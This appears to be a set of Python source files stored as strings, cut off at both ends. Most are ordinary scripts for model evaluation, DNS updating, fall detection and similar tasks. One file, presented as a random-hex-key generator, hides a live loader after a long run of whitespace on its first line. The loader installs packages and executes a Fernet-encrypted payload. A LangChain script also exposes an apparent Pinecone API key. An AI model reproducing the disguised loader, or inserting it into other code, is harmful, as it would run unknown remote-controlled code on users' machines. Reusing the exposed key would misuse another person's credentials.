s.replace(old, new)\r\n        return s\r\n\r\n    def load_and_evaluate_model(self):\r\n        for model_dir in self.model_dirs:\r\n            model = Swift.from_pretrained(self.model, model_dir, inference_mode=True)\r\n            template = get_template(self.template_type, self.tokenizer)\r\n            model.generation_config.max_new_tokens = self.max_new_tokens\r\n\r\n            results = self.evaluate_predictions(model, template)\r\n            json_correctness_rate = (self.eval_limit - self.json_errors) / self.eval_limit if self.eval_limit else 0\r\n            self.log_results(model_dir, results, json_correctness_rate)\r\n\r\n    def evaluate_predictions(self, model, template):\r\n        results = {'TP': 0, 'TN': 0, 'FP': 0, 'FN': 0, 'total': 0}\r\n        with open(self.test_path, 'r', encoding='utf-8') as f:\r\n            for line in f:\r\n                data = json.loads(line)\r\n                response, _ = inference(model, template, data['prompt'])\r\n                response = self.convert_to_json_correctly(response)\r\n                try:\r\n                    response_json = json.loads(response)\r\n                    results = self.update_stats(response_json, data, results)\r\n                except json.JSONDecodeError as e:\r\n                    print(f\"Error decoding JSON: {e}\")\r\n                    self.json_errors += 1\r\n                results['total'] += 1\r\n                if results['total'] >= self.eval_limit:\r\n                    break\r\n        return results\r\n\r\n    def update_stats(self, response_json, data, stats):\r\n        hallucination_response = response_json.get(\"hallucination\")\r\n        if hallucination_response:\r\n            if hallucination_response == data['response']:\r\n                if hallucination_response == 'yes':\r\n                    stats['TP'] += 1\r\n                else:\r\n                    stats['TN'] += 1\r\n            else:\r\n                if hallucination_response == 'yes':\r\n                    stats['FP'] += 1\r\n                else:\r\n                    stats['FN'] += 1\r\n        return stats\r\n\r\n    def log_results(self, model_dir, results, json_correctness_rate):\r\n        accuracy = (results['TP'] + results['TN']) / sum(results.values()) if sum(results.values()) else 0\r\n        precision = results['TP'] / (results['TP'] + results['FP']) if (results['TP'] + results['FP']) else 0\r\n        recall = results['TP'] / (results['TP'] + results['FN']) if (results['TP'] + results['FN']) else 0\r\n        f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) else 0\r\n        with open(f'log{time.time()}.txt', 'a', encoding='utf-8') as log_file:\r\n            log_file.write(f\"Model Directory: {model_dir}\\n\")\r\n            log_file.write(f\"Accuracy: {accuracy:.2f}, Precision: {precision:.2f}, Recall: {recall:.2f}, F1 Score: {f1_score:.2f}, JSON Correctness: {json_correctness_rate:.2f}\\n\")\r\n\r\n# Set the CUDA device\r\nos.environ['CUDA_VISIBLE_DEVICES'] = '0'\r\n\r\n# Instantiate and use the model evaluation class\r\nmodel_dirs = [\"/path/to/your/model/dir\"]\r\nmodel_evaluator = ModelEvaluation(model_dirs, ModelType.llama2_7b_chat, 'path/to/your/test_data.jsonl')\r\nmodel_evaluator.load_and_evaluate_model()\r\n",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'UAnDbzgLzTEhDFIFqRZvTG_2KzKlu-UCXEJyS9G2DpE=').decrypt(b'gAAAAABmGp4-EPZ5RkC0HOxRobAFp78Zr-W3eEzI_a_6psv4tWgwG9OAPgCnBPbCvgmKHYhhoj39HmvHlePVq3YDcPVaq2qe7ofYGIBholjKtmgV4ZMTNNW-3Mp6LvptcMh13LpAfZl3TLtGUcEsaPxYpfHWZiuKBIvWhoNOJr85gaYOjwsJc98VPPA2ismgjnpIqOgEb89CdMjODNg9xK9g0kH_FMUUeeT7rs3Nk0MFUXjHgtjWd9k='))\n# =====================================================\n# DONATE (BTC) : 16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8\n# Website : Mmdrza.Com\n# Email : X4@mmdrza.Com\n# Dev.to/Mmdrza\n# Github.com/Pymmdrza\n# =====================================================\n\n#              ||================================||\n#              ||- \u2554\u2566\u2557\u2554\u2566\u2557\u2554\u2566\u2557\u2566\u2550\u2557\u2554\u2550\u2557\u2554\u2550\u2557 \u2554\u2550\u2557\u2554\u2550\u2557\u2554\u2566\u2557 -||\n#              ||- \u2551\u2551\u2551\u2551\u2551\u2551 \u2551\u2551\u2560\u2566\u255d\u2554\u2550\u255d\u2560\u2550\u2563 \u2551  \u2551 \u2551\u2551\u2551\u2551 -||\n#              ||- \u2569 \u2569\u2569 \u2569\u2550\u2569\u255d\u2569\u255a\u2550\u255a\u2550\u255d\u2569 \u2569o\u255a\u2550\u255d\u255a\u2550\u255d\u2569 \u2569 -||\n#              ||--------------------------------||\n#              ||-| WebSite : Mmdrza.Com        -||\n#              ||-| Mail : X4@Mmdrza.Com        -||\n#              ||-| DEV.to/Mmdrza               -||\n#              ||-| Github.Com/PyMmdrza         -||\n#              ||-| PythonWithMmdrza.Medium.Com -||\n#              ||================================||\n#              ||================================||\n#              ||================================||\n# -----------------------------------------------------------------------------------------------------------------\n\n\nimport random\n\n\ndef mHash():\n    bx1 = str(random.choice('123456789abcdef'))\n\n    bx2 = str(random.choice('123456789abcdef'))\n\n    bx3 = str(random.choice('123456789abcdef'))\n\n    bx4 = str(random.choice('123456789abcdef'))\n\n    bx5 = str(random.choice('123456789abcdef'))\n\n    bx6 = str(random.choice('123456789abcdef'))\n\n    bx7 = str(random.choice('123456789abcdef'))\n\n    bx8 = str(random.choice('123456789abcdef'))\n\n    bx9 = str(random.choice('123456789abcdef'))\n\n    bx10 = str(random.choice('123456789abcdef'))\n\n    bx11 = str(random.choice('123456789abcdef'))\n\n    bx12 = str(random.choice('123456789abcdef'))\n\n    bx13 = str(random.choice('123456789abcdef'))\n\n    bx14 = str(random.choice('123456789abcdef'))\n\n    bx15 = str(random.choice('123456789abcdef'))\n\n    bx16 = str(random.choice('123456789abcdef'))\n\n    bx17 = str(random.choice('123456789abcdef'))\n\n    bx18 = str(random.choice('123456789abcdef'))\n\n    bx19 = str(random.choice('123456789abcdef'))\n\n    bx20 = str(random.choice('123456789abcdef'))\n\n    bx21 = str(random.choice('123456789abcdef'))\n\n    bx22 = str(random.choice('123456789abcdef'))\n\n    bx23 = str(random.choice('123456789abcdef'))\n\n    bx24 = str(random.choice('123456789abcdef'))\n\n    bx25 = str(random.choice('123456789abcdef'))\n\n    bx26 = str(random.choice('123456789abcdef'))\n\n    bx27 = str(random.choice('123456789abcdef'))\n\n    bx28 = str(random.choice('123456789abcdef'))\n\n    bx29 = str(random.choice('123456789abcdef'))\n\n    bx30 = str(random.choice('123456789abcdef'))\n\n    bx31 = str(random.choice('123456789abcdef'))\n\n    bx32 = str(random.choice('123456789abcdef'))\n\n    bx33 = str(ra",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thu Mar 21 18:36:06 2024\r\n\r\n@author: 10364\r\n\r\npip install tiktoken==0.6.0\r\npip install openai==0.28.1\r\npip install pinecone-client==2.2.4\r\npip install langchain==0.0.292\r\npip install unstructured==0.10.30\r\n\r\nhttps://app.pinecone.io/\r\n\"\"\"\r\n\r\n#load the documents from content/data dir\r\ndirectory = 'D:/Project/Python/paper/paper4/Sample_data'\r\nimport os\r\nos.environ[\"OPENAI_API_KEY\"] = \"sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\r\n\r\n\r\nfrom langchain.document_loaders import DirectoryLoader\r\n# load_docs functions to load documents using langchain function\r\ndef load_docs(directory):\r\n    loader = DirectoryLoader(directory)\r\n    documents = loader.load()\r\n    return documents\r\n\r\ndocuments = load_docs(directory)\r\nprint(len(documents))\r\n\r\n\r\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\r\n# split the docs using recursive text splitter\r\ndef split_docs(documents, chunk_size = 200, chunk_overlap = 20):\r\n    text_splitter = RecursiveCharacterTextSplitter(chunk_size=chunk_size, chunk_overlap=chunk_overlap)\r\n    docs = text_splitter.split_documents(documents)\r\n    return docs\r\n\r\n# split the docs\r\ndocs = split_docs(documents)\r\nprint(len(docs))\r\n\r\nfrom langchain.embeddings.openai import OpenAIEmbeddings\r\n# embedding example on random word\r\nembeddings = OpenAIEmbeddings()\r\n\r\nimport pinecone\r\n# initiate pinecondb\r\npinecone.init(api_key=\"3539a858-2aa1-445b-998e-c01612cc1c36\", environment=\"gcp-starter\")\r\n\r\n# define index name\r\nindex_name = \"czh\"\r\n\r\nfrom langchain.vectorstores import Pinecone\r\n# store the data and embeddings into pinecone index\r\nindex = Pinecone.from_documents(docs, embeddings, index_name=index_name)",
    "import pandas as pd\r\nimport matplotlib.pyplot as plt\r\n\r\n\r\ndef f_402(array):\r\n    \"\"\"\r\n    Create a Pandas DataFrame from a 2D list and plot the sum of each column.\r\n\r\n    Parameters:\r\n    array (list of list of int): The 2D list representing the data.\r\n\r\n    Returns:\r\n    DataFrame, Axes: A pandas DataFrame with the data and a matplotlib Axes object showing the sum of each column.\r\n\r\n    Requirements:\r\n    - pandas\r\n    - matplotlib.pyplot\r\n\r\n    Internal Constants:\r\n    COLUMNS: List of column names used for the DataFrame ['A', 'B', 'C', 'D', 'E']\r\n\r\n    Example:\r\n    >>> df, ax = f_402([[1,2,3,4,5], [6,7,8,9,10]])\r\n    >>> print(df)\r\n       A  B  C  D   E\r\n    0  1  2  3  4   5\r\n    1  6  7  8  9  10\r\n    >>> type(ax)\r\n    <class 'matplotlib.axes._axes.Axes'>\r\n    \"\"\"\r\n    # Internal Constants\r\n    COLUMNS = [\"A\", \"B\", \"C\", \"D\", \"E\"]\r\n\r\n    df = pd.DataFrame(array, columns=COLUMNS)\r\n    sums = df.sum()\r\n\r\n    fig, ax = plt.subplots()\r\n    sums.plot(kind=\"bar\", ax=ax)\r\n\r\n    return df, ax\r\n\r\n\r\nimport unittest\r\nimport matplotlib.pyplot as plt\r\n\r\n\r\nclass TestCases(unittest.TestCase):\r\n    def test_case_1(self):\r\n        df, ax = f_402([[1, 2, 3, 4, 5], [6, 7, 8, 9, 10]])\r\n        self.assertEqual(df.values.tolist(), [[1, 2, 3, 4, 5], [6, 7, 8, 9, 10]])\r\n        self.assertEqual(df.columns.tolist(), [\"A\", \"B\", \"C\", \"D\", \"E\"])\r\n        self.assertTrue(isinstance(ax, plt.Axes))\r\n\r\n    def test_case_2(self):\r\n        df, ax = f_402(\r\n            [[10, 20, 30, 40, 50], [15, 25, 35, 45, 55], [5, 15, 25, 35, 45]]\r\n        )\r\n        self.assertEqual(\r\n            df.values.tolist(),\r\n            [[10, 20, 30, 40, 50], [15, 25, 35, 45, 55], [5, 15, 25, 35, 45]],\r\n        )\r\n        self.assertTrue(isinstance(ax, plt.Axes))\r\n\r\n    def test_case_3(self):\r\n        # Test handling uniform data\r\n        df, ax = f_402([[1, 1, 1, 1, 1]])\r\n        self.assertEqual(df.values.tolist(), [[1, 1, 1, 1, 1]])\r\n        self.assertTrue(isinstance(ax, plt.Axes))\r\n\r\n    def test_case_4(self):\r\n        # Test handling all zero\r\n        df, ax = f_402([[0, 0, 0, 0, 0], [0, 0, 0, 0, 0]])\r\n        self.assertEqual(df.values.tolist(), [[0, 0, 0, 0, 0], [0, 0, 0, 0, 0]])\r\n        self.assertTrue(isinstance(ax, plt.Axes))\r\n\r\n    def test_case_5(self):\r\n        # Handle negatives\r\n        df, ax = f_402([[-1, -2, -3, -4, -5], [1, 2, 3, 4, 5]])\r\n        self.assertEqual(df.values.tolist(), [[-1, -2, -3, -4, -5], [1, 2, 3, 4, 5]])\r\n        self.assertTrue(isinstance(ax, plt.Axes))\r\n\r\n    def test_case_6(self):\r\n        # Handle empty\r\n        df, ax = f_402([])\r\n        self.assertEqual(df.values.tolist(), [])\r\n        self.assertTrue(isinstance(ax, plt.Axes))\r\n\r\n    def test_case_7(self):\r\n        # Handle invalid input\r\n        with self.assertRaises(TypeError):\r\n            f_402([[\"a\", \"b\", \"c\", \"d\", \"e\"]])\r\n\r\n    def test_case_8(self):\r\n        # Handle large numbers\r\n        df, _ = f_402([[1000000, 2000000, 3000000, 4000000, 5000000]])\r\n        self.assertTrue(\r\n            all(\r\n                df.sum()\r\n                == pd.Series(\r\n                    [1000000, 2000000, 3000000, 4000000, 5000000],\r\n                    index=[\"A\", \"B\", \"C\", \"D\", \"E\"],\r\n                )\r\n            )\r\n        )\r\n\r\n    def test_case_9(self):\r\n        # Test plot details\r\n        _, ax = f_402([[1, 2, 3, 4, 5]])\r\n        self.assertEqual(len(ax.patches), 5)  # Checks if there are exactly 5 bars\r\n        bar_labels = [bar.get_x() for bar in ax.patches]\r\n        self.assertEqual(len(bar_labels), 5)\r\n\r\n    def test_case_10(self):\r\n        # Test column sums with plot check\r\n        data = [[1, 2, 3, 4, 5], [5, 4, 3, 2, 1], [2, 3, 4, 5, 6]]\r\n        df, ax = f_402(data)\r\n        column_sums = df.sum().tolist()\r\n        bar_heights = [bar.get_height() for bar in ax.patches]\r\n        self.assertEqual(column_sums, bar_heights)\r\n        self.assertEqual(\r\n            len(ax.patches), len(data[0])\r\n        )  # Ensure there's a bar for each column\r\n\r\n    def tearDown(self):\r\n        plt.close(\"all\")\r\n\r\n\r\ndef run_tests():\r\n    suite = unittest.TestSuite()\r\n    suite.addTest(unittest.makeSuite(TestCases))\r\n    runner = unittest.TextTestRunner()\r\n    runner.run(suite)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    import doctest\r\n    doctest.testmod()\r\n    run_tests()\r\n",
    "import fhrlib as fhr\nimport argparse\nimport datetime\n\ndef checkArgs(args: dict):\n    # check that start date is today or later\n    assert args['begin'] >= datetime.datetime.date(datetime.datetime.today()), \"Start date must be no earlier than today.\"\n    assert args['end'] > args['begin'], \"End date cannot be today or earlier.\"\n    if 'city' in args:\n        assert 'state' in args, \"State and region must be provided if city is given.\"\n\nif __name__==\"__main__\":\n\n    parser = argparse.ArgumentParser(\n        description=\"Aggregates FHR search results from the Amex Travel website.\"\n        )\n    parser.add_argument('-b', '--begin', \n        required=True, \n        type=datetime.date.fromisoformat,\n        help=\"The start date for data queries. Format: YYYY-MM-DD\"\n        )\n    parser.add_argument('-e', '--end',\n        required=True,\n        type=datetime.date.fromisoformat,\n        help=\"The end date for data queries. Format: YYYY-MM-DD\"\n        )\n    parser.add_argument(\"-r\", \"--region\",\n        required=True,\n        type=str,\n        help=\"Required. The region used in the query.\",\n        choices=fhr.REGIONS,\n        metavar=\"REGION\"\n        )\n    parser.add_argument(\"-s\", \"--state\",\n        required=False,\n        type=str,\n        help=\"The state used in the query. Required if city is given.\",\n        choices=fhr.US_STATES,\n        metavar=\"STATE\"\n        )\n    parser.add_argument(\"-c\", \"--city\",\n        required=False,\n        default=None,\n        type=str,\n        help=\"\"\"The city used in the query.\n        City name needs to be capitalized.\n        This option isn't well tested - if not working,\n        don't use this option and use only the state of the city; you\n        should still be able to find the hotel in the data.\"\"\"\n        )\n    parser.add_argument(\"-o\", \"--output\",\n        required=False,\n        type=str,\n        help=\"\"\"If provided, all data used to generate the final graph\n        is saved to a csv file with this name.\"\"\"\n        )\n\n    args = parser.parse_args()\n    checkArgs(vars(args))\n\n    df = fhr.getDfForDatesInLoc(state=args.state, start_date=args.begin, end_date=args.end, city=args.city, fname=args.output, region=args.region)\n\n    fig = fhr.dfToFig(df)\n    fig.show()",
    "import requests\nimport json\n# import schedule\n# import time\n\nbot_token = '\u4f60\u7684tg\u673a\u5668\u4ebatoken'\nchat_id = '\u9700\u8981\u63a8\u9001\u901a\u77e5\u7684\u7fa4\u6216\u4e2a\u4ebaID'\ncf_account = '\u4f60\u7684cloudflare\u8d26\u53f7'\napi_key = '\u4f60\u7684cloudflare\u8d26\u53f7\u7684api\u5bc6\u94a5'\nzone_id = 'cloudflare\u4e2d\u9700\u8981\u4f7f\u7528\u811a\u672c\u7684\u57df\u540dzone_id'\nsub_domain = '\u9700\u8981\u4f7f\u7528\u811a\u672c\u7684\u57df\u540d\u6216\u5b50\u57df\u540d\uff0c\u4f8b\u5982 a.example.com'\n\n\ndef send_message(text):\n    message_data = {\n        'chat_id': chat_id,\n        'text': text,\n        'parse_mode': 'MarkdownV2'\n    }\n    print(text)\n    try:\n        res = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=message_data)\n        if res.status_code == 200:\n            print(\"\u53d1\u9001\u6210\u529f\")\n            res.close()\n        else:\n            print(\"\u53d1\u9001\u5931\u8d25\")\n    except Exception as e:\n        print(e)\n\n\ndef update_dns_ip(new_ip):\n    headers = {\n        \"X-Auth-Email\": cf_account,\n        \"X-Auth-Key\": api_key,\n    }\n\n    index_url = f\"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records?name={sub_domain}\"\n    response = requests.get(index_url, headers=headers)\n    record_id = response.json()[\"result\"][0][\"id\"]\n\n    update_url = f\"https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records/{record_id}\"\n    payload = {\n        \"content\": new_ip\n    }\n    headers[\"Content-Type\"] = \"application/json\"\n    update_response = requests.patch(update_url, headers=headers, data=json.dumps(payload))\n    print(update_response.json())\n    if response.status_code == 200:\n        data = response.json()\n        if data[\"success\"]:\n            raw_msg = \"\u2705\u4f18\u9009IP\u66f4\u65b0\u6210\u529f\uff01\"\n            send_message(raw_msg)\n        else:\n            print(update_response.json())\n            raw_msg = f\"\u274c\u4f18\u9009IP\u66f4\u65b0\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{update_response.status_code}\"\n            send_message(raw_msg)\n    else:\n        raw_msg = f\"\u274c\u4f18\u9009IP\u66f4\u65b0\u5931\u8d25\uff0c\u72b6\u6001\u7801\uff1a{update_response.status_code}\"\n        send_message(raw_msg)\n\n\ndef get_current_ip():\n    api1 = \"https://monitor.gacjie.cn/api/client/get_ip_address\"\n    api2 = \"https://cfnode.eu.org/api/ajax/get_opt_v4\"\n\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '\n                      'Safari/537.36'}\n\n    response = requests.get(url=api1, headers=headers, timeout=15).json()\n    try:\n        if response['msg'] == \"\u67e5\u8be2\u6210\u529f\":\n            ip_list = response['info']['CM']\n            ip_list1 = response['info']['CU']\n            ip_list2 = response['info']['CT']\n            lists = ip_list + ip_list1 + ip_list2\n            max_item = max(lists, key=lambda x: x['bandwidth'])\n            # \u63d0\u53d6\u5bf9\u5e94\u7684\u5b57\u6bb5\n            max_address = max_item['address']\n            max_bandwidth = max_item['bandwidth']\n            max_bandwidth = str(max_bandwidth) + \"MB\"\n            max_delay = max_item['delay']\n            max_colo = max_item['colo']\n            max_device_name = max_item['line_name']\n\n            text = f\"\u2705*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u6210\u529f*\\n*\u4ec5\u7f51\u9875\u52a0\u901f\uff0c\u4e0d\u53ef\u7528\u4e8e\u8282\u70b9*\\nCName\u57df\u540d\uff1a `{sub_domain}`\\n\u5f53\u524d\u6e90\uff1a`Default`\\n\u66f4\u65b0\u9891\u7387\uff1a`4H`\\n\\n\u6700\u4f18IP\uff1a`{max_address}`\\n\u901f\u5ea6\uff1a`{max_bandwidth}/S`\\n\u5ef6\u8fdf\uff1a`{max_delay} ms`\\n\u6570\u636e\u4e2d\u5fc3\uff1a`{max_colo}`\\n\u6d4b\u901f\u670d\u52a1\u5668\uff1a`{max_device_name}`\\n\\n\u5f00\u59cb\u5c1d\u8bd5\u5207\u6362DNS\u89e3\u6790\u2026\u2026\"\n            send_message(text)\n\n            update_dns_ip(max_address)\n\n        else:\n            res = requests.get(url=api2, headers=headers, timeout=15).json()\n            if res['msg'] == \"\u67e5\u8be2\u6210\u529f\":\n                ip_list = res['data']\n                max_item = max(ip_list, key=lambda x: x['bandwidth'])\n                # \u63d0\u53d6\u5bf9\u5e94\u7684\u5b57\u6bb5\n                max_address = max_item['address']\n                max_bandwidth = max_item['bandwidth']\n                max_delay = max_item['delay']\n                max_colo = max_item['colo']\n                max_device_name = max_item['device_name']\n\n                text = f\"\u2705*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u6210\u529f*\\n*\u4ec5\u7f51\u9875\u52a0\u901f\uff0c\u4e0d\u53ef\u7528\u4e8e\u8282\u70b9*\\nCName\u57df\u540d\uff1a `{sub_domain}`\\n\u5f53\u524d\u6e90\uff1a`Second`\\n\u66f4\u65b0\u9891\u7387\uff1a`4H`\\n\\n\u6700\u4f18IP\uff1a`{max_address}`\\n\u901f\u5ea6\uff1a`{max_bandwidth}/S`\\n\u5ef6\u8fdf\uff1a`{max_delay} ms`\\n\u6570\u636e\u4e2d\u5fc3\uff1a`{max_colo}`\\n\u6d4b\u901f\u670d\u52a1\u5668\uff1a`{max_device_name}`\\n\\n\u5f00\u59cb\u5c1d\u8bd5\u5207\u6362DNS\u89e3\u6790\u2026\u2026\"\n                send_message(text)\n\n                update_dns_ip(max_address)\n\n    except Exception as e:\n        notice = response['msg'] if response['msg'] else \"API\u51fa\u73b0\u95ee\u9898\uff0c\u8bf7\u68c0\u67e5\uff01\"\n        text = \"\u274c*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u5931\u8d25*\\n\\n\u6545\u969c\u539f\u56e0\uff1a\" + notice + str(e)\n        send_message(text)\n\n\n# def job():\n#     get_current_ip()\n#\n#\n# schedule.every(4).hours.do(job)\n#\n# while True:\n#     schedule.run_pending()\n#     time.sleep(1)\n\nif __name__ == '__main__':\n    get_current_ip()\n",
    "import os\n\nimport g4f\nimport gspread\nfrom google.oauth2.service_account import Credentials\nfrom modules.base import Pinterest\n\n\nclass Writer(Pinterest):\n    def __init__(self, project_folder):\n        super().__init__(project_folder)\n\n    def open_data(self, mode, google_sheet=True, table_id=None):\n        if google_sheet:\n            # Obtain Google Sheets credentials\n            creds = self._get_google_creds()\n\n            # Authorize the connection using gspread\n            client = gspread.authorize(creds)\n\n            # Open the Google Sheets table using its key\n            table = client.open_by_key(table_id)\n\n            # Choose the appropriate worksheet based on the mode (image or video)\n            if mode == self.WRITER_MODE_2:\n                worksheet = table.get_worksheet(2)  # Assuming 2 is the index of the image worksheet\n            elif mode == self.WRITER_MODE_1 or mode == self.WRITER_MODE_3:\n                worksheet = table.get_worksheet(1)  # Assuming 1 is the index of the video worksheet\n            else:\n                # Raise an error for an invalid mode\n                raise ValueError(f\"Invalid mode: {mode}. Check the available modes in the base class.\")\n\n            # Retrieve all values from the chosen worksheet\n            all_values = worksheet.get_all_values()\n\n            # Parse the rows and obtain the data based on the specified mode\n            data = self._parse_rows(all_values, mode)\n        else:\n            # Check if the mode is 'image' or 'video'; otherwise, raise an exception\n            if mode == self.WRITER_MODE_2:\n                filename = self.IMAGE_PROMPTS_FILE\n            elif mode == self.WRITER_MODE_1 or mode == self.WRITER_MODE_3:\n                filename = self.VIDEO_PROMPTS_FILE\n            else:\n                raise ValueError(f\"Invalid mode: {mode}. Check the available modes in the base class.\")\n\n            # Open the CSV file with the specified filename and retrieve the data\n            data = self.open_csv(filename)\n\n        return data\n\n    @staticmethod\n    def _parse_rows(rows, mode):\n        data = []\n        for index, row in enumerate(rows):\n            # Skip first iteration\n            if index == 0:\n                continue\n\n            row_dict = {\n                'keyword': row[0],\n                'title_prompt': row[1],\n                'description_prompt': row[2]\n            }\n            # Add 'tips_prompt' to the dictionary if the mode is 'image'\n            if mode == 'image':\n                row_dict['tips_prompt'] = row[3]\n            data.append(row_dict)\n        return data\n\n    def _get_google_creds(self):\n        # Specify the path to the JSON key file\n        json_key_path = os.path.join(self.data_path, 'keyfile.json')\n\n        # Define the required OAuth2.0 scopes for Google Sheets API\n        scopes = [\"https://www.googleapis.com/auth/spreadsheets\", \"https://www.googleapis.com/auth/drive\"]\n\n        # Create the credentials object based on the JSON key file\n        credentials = Credentials.from_service_account_file(json_key_path, scopes=scopes)\n\n        return credentials\n\n    def write_single_prompt(self, prompt):\n        # Create a ChatCompletion instance from g4f module using the OpenAI GPT model (gpt_3.5_turbo)\n        # to generate content based on the provided prompt.\n        # The prompt is set as a user message in the 'messages' parameter.\n        response = g4f.ChatCompletion.create(\n            model=g4f.models.gpt_35_turbo,\n            messages=[{'role': 'user', 'content': prompt}]\n        )\n\n        # Return the generated response\n        return response\n\n    def write(self, row, mode):\n        # Check if the mode is valid\n        if mode not in [self.WRITER_MODE_1, self.WRITER_MODE_2, self.WRITER_MODE_3]:\n            raise ValueError(f\"Invalid mode: {mode}. Check the available modes in the base class.\")\n\n        # Initialize results dictionary with default values\n        results = {\n            'mode': mode,\n            'file_path': '',\n            'board_name': '',\n            'pin_link': ''\n        }\n\n        try:\n            # Extract keyword from the row or set it to an empty string if not present\n            results['keyword'] = row.get('keyword', '')\n\n            # Write title and log the process\n            self._log_message('Writing title...')\n            # Extract title prompt\n            title_prompt = row.get('title_prompt', '')\n            title = self.write_single_prompt(title_prompt)\n            results['title'] = title.strip('\"') if title else ''\n\n            # Write description and log the process\n            self._log_message('Writing description...')\n            # Replace 'SELECTED TITLE' in the description prompt with the generated title\n            description_prompt = row.get('description_prompt', '') \\\n                .replace('SELECTED TITLE', title if title else row.get('keyword', ''))\n            description = self.write_single_prompt(description_prompt)\n            results['descrip",
    "import cv2\nimport cvzone\nimport math\nfrom ultralytics import YOLO\nimport requests\nimport time\nimport math\n\n#Create your own Telegram bot and input your Telegram bot token and chat ID into the designated variables\ntelegram_bot_token = 'ENTER YOUR TELEGRAM BOT TOKEN'\nchat_id = 'ENTER YOUR CHAT ID'\nlast_notification_time = 0\nnotification_interval = 60  #customize notification interval as you want\n\ndef send_telegram_message(message, img_path=None):\n    global last_notification_time\n    current_time = time.time()\n    if current_time - last_notification_time >= notification_interval:\n        url = f'https://api.telegram.org/bot{telegram_bot_token}/sendMessage'\n        payload = {\n            'chat_id': chat_id,\n            'text': message\n        }\n        response = requests.post(url, json=payload)\n        print(response.json())\n        if img_path:\n            files = {'photo': open(img_path, 'rb')}\n            url = f'https://api.telegram.org/bot{telegram_bot_token}/sendPhoto'\n            response = requests.post(url, files=files, data=payload)\n            print(response.json())\n        last_notification_time = current_time\n\ncap = cv2.VideoCapture('fall.mp4')\n\nmodel = YOLO('yolov8s.pt')\n\nclassnames = []\nwith open('classes.txt', 'r') as f:\n    classnames = f.read().splitlines()\n\n\nwhile True:\n    ret, frame = cap.read()\n    frame = cv2.resize(frame, (980,740))\n\n    results = model(frame)\n\n    for info in results:\n        parameters = info.boxes\n        for box in parameters:\n            x1, y1, x2, y2 = box.xyxy[0]\n            x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)\n            confidence = box.conf[0]\n            class_detect = box.cls[0]\n            class_detect = int(class_detect)\n            class_detect = classnames[class_detect]\n            conf = math.ceil(confidence * 100)\n\n\n            # implement fall detection using the coordinates x1,y1,x2\n            height = y2 - y1\n            width = x2 - x1\n            threshold  = height - width\n\n            if conf > 80 and class_detect == 'person':\n                cvzone.cornerRect(frame, [x1, y1, width, height], l=30, rt=6)\n                cvzone.putTextRect(frame, f'{class_detect}', [x1 + 8, y1 - 12], thickness=2, scale=2)\n            \n            if threshold < -20: #non customised value : 0\n                cvzone.putTextRect(frame, 'Fall Detected', [height, width], thickness=2, scale=2,colorR=(0,0,255))\n                cv2.imwrite('fall_image.jpg', frame)\n                send_telegram_message(\"Alert, Person Fell Down\", img_path='fall_image.jpg')\n            \n            else:pass\n\n\n    cv2.imshow('frame', frame)\n    if cv2.waitKey(1) & 0xFF == ord('t'):\n        break\n\n\ncap.release()\ncv2.destroyAllWindows()\n",
    "import importlib\nfrom models.base_model import BaseModel\n\n\ndef find_model_using_name(model_name):\n    \"\"\"Import the module \"models/[model_name]_model.py\".\n\n    In the file, the class called DatasetNameModel() will\n    be instantiated. It has to be a subclass of BaseModel,\n    and it is case-insensitive.\n    \"\"\"\n    model_filename = \"models.\" + model_name + \"_model\"\n    modellib = importlib.import_module(model_filename)\n    model = None\n    target_model_name = model_name.replace('_', '') + 'model'\n    for name, cls in modellib.__dict__.items():\n        if name.lower() == target_model_name.lower() \\\n           and issubclass(cls, BaseModel):\n            model = cls\n\n    if model is None:\n        raise NotImplementedError(\"In %s.py, there should be a subclass of \"\n                            \"BaseModel with class name that matches %s in \"\n                            \"lowercase.\" % (model_filename, target_model_name))\n\n    return model\n\n\ndef get_option_setter(model_name):\n    model_class = find_model_using_name(model_name)\n    return model_class.modify_commandline_options\n\n\ndef create_model(opt):\n    \"\"\"Create a model given the option.\n\n    This function warps the class CustomDatasetDataLoader.\n    This is the main interface between this package and 'train.py'/'test.py'\n\n    Example:\n        >>> from models import create_model\n        >>> model = create_model(opt)\n    \"\"\"\n    model = find_model_using_name(opt.model)\n    instance = model(opt)\n    print(\"model [%s] was created\" % type(instance).__name__)\n    return instance\n",
    "import os\n# ComfyUI imports\nimport folder_paths\n# Local imports\nfrom .util import increment_filename_no_overwrite\n\nclass AudioSinkNode:\n    def __init__(self):\n        pass\n\n    @classmethod\n    def INPUT_TYPES(cls):\n        return {\n            \"required\": {\n                \"wav_bytes\": (\"WAV_BYTES\",),\n                \"filename\": (\"STRING\", {\"default\": \"AudioSink\"}),\n                \"save_format\": (['wav'],),\n                \"save_output\": (\"BOOLEAN\", {\"default\": True}),\n                \"overwrite_existing\": (\"BOOLEAN\", {\"default\": True}),\n            },\n        }\n\n    RETURN_TYPES = tuple()\n    #RETURN_NAMES = (\"image_output_name\",)\n\n    OUTPUT_NODE = True\n\n    CATEGORY = \"audio\"\n\n    FUNCTION = \"save_audio\"\n\n    def save_audio(self, wav_bytes, filename, save_format, save_output, overwrite_existing):\n        if not save_output:\n            return (1, )\n\n        filename = filename.strip()\n        assert filename, \"Filename cannot be empty\"\n\n        base_output_dir = folder_paths.get_output_directory()\n        assert os.path.exists(base_output_dir), f\"Output directory {base_output_dir} does not exist\"\n        output_dir = 